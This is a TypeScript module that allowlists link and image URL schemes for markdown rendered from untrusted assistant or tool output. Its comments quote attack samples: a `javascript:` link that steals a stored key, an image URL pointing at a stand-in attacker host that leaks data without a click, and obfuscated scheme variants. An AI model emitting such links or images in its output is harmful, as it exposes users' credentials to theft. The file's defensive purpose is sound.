/**
 * URL allowlisting for markdown rendered from UNTRUSTED content (assistant /
 * tool output). `solid-markdown` does not sanitize `href`/`src` by default
 * (its `transformLinkUri` default is `null`), so without these a model can emit
 * `[x](javascript:…)` — one click runs script in the app origin, which can read
 * the persisted ZeroID key from localStorage and drive the authenticated socket.
 *
 * Pass `safeLinkUri` as `transformLinkUri` and `safeImageUri` as
 * `transformImageUri` on every `<SolidMarkdown>` that renders model output.
 */

/** Link schemes we allow. Everything else (javascript:, data:, vbscript:,
 * file:, …) is dropped. Relative and anchor URLs always pass. */
const SAFE_LINK_PROTOCOLS = ["http", "https", "mailto", "tel"];

/**
 * Return `uri` if it is safe to use as an `<a href>`, else `""` (which renders
 * a non-navigable link). Mirrors the battle-tested react-markdown
 * `uriTransformer`: a leading `scheme:` is only honored when the scheme is on
 * the allowlist, and a `:` that appears after the first `?`/`#` is treated as
 * data inside a relative URL rather than a scheme. This defeats obfuscations
 * like `java\tscript:` (no valid scheme match → treated as relative, so the
 * browser's own scheme parser never sees a control-laced `javascript:`).
 */
export function safeLinkUri(uri: string): string {
  const url = (uri ?? "").trim();
  if (url === "") return "";
  const first = url.charAt(0);
  if (first === "#" || first === "/") return url; // anchor / root-relative

  const colon = url.indexOf(":");
  if (colon === -1) return url; // no scheme → relative

  for (const protocol of SAFE_LINK_PROTOCOLS) {
    if (
      colon === protocol.length &&
      url.slice(0, protocol.length).toLowerCase() === protocol
    ) {
      return url;
    }
  }

  // A `:` after the first `?`/`#` belongs to the query/fragment, not a scheme.
  const q = url.indexOf("?");
  if (q !== -1 && colon > q) return url;
  const h = url.indexOf("#");
  if (h !== -1 && colon > h) return url;

  return "";
}

/**
 * Return `src` if it is safe to auto-load as an `<img>`, else `""`. In addition
 * to the scheme rules above, REMOTE image URLs (http/https) are dropped: an
 * `![](https://attacker/?leak=…)` in model output is a zero-click exfiltration
 * channel (the browser fetches it the moment the row mounts). Inline `data:`
 * images and relative/same-origin paths — which cannot exfiltrate — are allowed.
 */
export function safeImageUri(src: string): string {
  const url = (src ?? "").trim();
  if (url === "") return "";
  // Protocol-relative / network-path references (//host, and backslash-
  // obfuscated variants /\host, \\host that browsers normalize) fetch
  // cross-origin under the page's scheme — a zero-click exfil channel. Treat
  // them like http(s), NOT same-origin, so they must be caught before the
  // root-relative `/` allowance below.
  if (/^[/\\]{2}/.test(url)) return "";
  const first = url.charAt(0);
  if (first === "#" || first === "/") return url; // anchor / root-relative

  const colon = url.indexOf(":");
  if (colon === -1) return url; // no scheme → relative

  // Inline data: images never touch the network → safe from exfiltration.
  if (/^data:image\//i.test(url)) return url;

  // A `:` after the first `?`/`#` belongs to the query/fragment, not a scheme.
  const q = url.indexOf("?");
  if (q !== -1 && colon > q) return url;
  const h = url.indexOf("#");
  if (h !== -1 && colon > h) return url;

  // Any real scheme here means a network fetch (http/https) or a dangerous
  // scheme — drop it so untrusted content can't silently exfiltrate.
  return "";
}
